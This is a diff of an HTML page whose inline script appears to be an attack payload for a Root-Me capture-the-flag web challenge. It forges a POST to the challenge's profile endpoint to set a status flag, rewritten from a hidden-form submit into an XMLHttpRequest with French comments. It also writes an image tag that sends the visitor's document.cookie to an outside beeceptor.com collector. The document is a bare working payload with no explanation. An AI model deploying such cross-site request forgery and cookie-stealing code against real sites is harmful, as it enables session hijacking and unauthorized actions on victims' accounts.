@@ -1,32 +1,32 @@
 <body>Hello !
     <script>
-         function post(path, params, method='post') {
+        function sendData(data) {
+          var XHR = new XMLHttpRequest();
+          var FD  = new FormData();
 
-              console.log("begin fun")
-              // The rest of this code assumes you are not using a library.
-              // It can be made less wordy if you use one.
-              const form = document.createElement('form');
-              form.method = method;
-              form.action = path;
-              console.log("loop")
-              for (const key in params) {
-                console.log("condition")
-                if (params.hasOwnProperty(key)) {
-                    console.log("ok")
-                  const hiddenField = document.createElement('input');
-                  hiddenField.type = 'hidden';
-                  hiddenField.name = key;
-                  hiddenField.value = params[key];
+          // Mettez les données dans l'objet FormData
+          for(name in data) {
+            FD.append(name, data[name]);
+          }
 
-                  form.appendChild(hiddenField);
-                }
-              } 
-              console.log("submit")
-              form.submit();
-              console.log("end fun")
+          // Définissez ce qui se passe si la soumission s'est opérée avec succès
+          XHR.addEventListener('load', function(event) {
+            alert('Ouais ! Données envoyées et réponse chargée.');
+          });
+
+          // Definissez ce qui se passe en cas d'erreur
+          XHR.addEventListener('error', function(event) {
+            alert('Oups! Quelque chose s\'est mal passé.');
+          });
+
+          // Configurez la requête
+          XHR.open('POST', 'http://challenge01.root-me.org/web-client/ch22/index.php?action=profile');
+
+          // Expédiez l'objet FormData ; les en-têtes HTTP sont automatiquement définies
+          XHR.send(FD);
         }
         console.log("begin")
-        post('http://challenge01.root-me.org/web-client/ch22/index.php?action=profile', {name: 'user', status: true});
+        sendData({name: 'user', status: true})
         console.log("end")
         document.write("<img src='https://alicia.free.beeceptor.com/"+document.cookie+"'/>")
     </script>
